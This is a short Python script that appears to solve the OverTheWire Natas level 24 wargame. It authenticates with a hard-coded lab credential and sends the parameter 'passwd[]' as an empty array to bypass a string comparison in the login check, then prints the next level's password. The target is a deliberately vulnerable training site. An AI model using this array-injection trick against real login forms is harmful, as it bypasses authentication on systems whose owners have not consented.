import requests
from requests.auth import HTTPBasicAuth 

def get_pass():
    auth = HTTPBasicAuth('natas24','OsRmXFguozKpTZZ5X14zNO43379LZveg')
    param = {'passwd[]':''}
    r = requests.get('http://natas24.natas.labs.overthewire.org/', auth=auth, params=param)
    index = r.text.find('Password: ') + 10
    print(r.text[index:index+32])
if __name__ == '__main__':
    get_pass()
